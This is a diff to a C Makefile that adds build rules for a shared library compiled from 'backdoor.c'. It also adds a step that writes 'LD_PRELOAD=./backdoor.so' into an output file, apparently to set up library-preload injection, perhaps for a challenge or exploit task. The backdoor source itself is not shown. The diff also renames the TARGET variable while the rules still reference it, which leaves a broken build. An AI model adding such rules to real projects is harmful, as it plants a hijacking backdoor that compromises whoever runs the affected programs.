@@ -1,16 +1,33 @@
 # Compiler and flags
 CC = gcc
 CFLAGS = -Wall -Wextra -O2
+PICFLAGS = -fPIC -shared
+LDFLAGS = -ldl
 
-# Target name
-TARGET = prog
+# Targets
+HELLO_TARGET = prog
+SO_TARGET = outputs/backdoor.so
+PR_FILE = outputs/pr.txt
 
-# Build rule
-all: $(TARGET)
+# Default rule
+all: $(TARGET) $(SO_TARGET) write-pr
 
+# Rule to build the binary
 $(TARGET): main.c
-	$(CC) $(CFLAGS) -o $(TARGET) main.c
+	$(CC) $(CFLAGS) -o $@ main.c
 
-# Clean rule
+# Rule to build shared object from backdoor.c
+$(SO_TARGET): backdoor.c | outputs
+	$(CC) $(PICFLAGS) -o $@ backdoor.c $(LDFLAGS)
+
+# Rule to overwrite pr.txt with LD_PRELOAD env variable
+$(PR_FILE): | outputs
+	echo -e "1\nLD_PRELOAD=./backdoor.so" > $@
+
+write-pr: $(PR_FILE)
+	@echo "Written $(PR_FILE)"
+
+# Clean everything
 clean:
 	rm -f $(TARGET)
+	rm -rf outputs
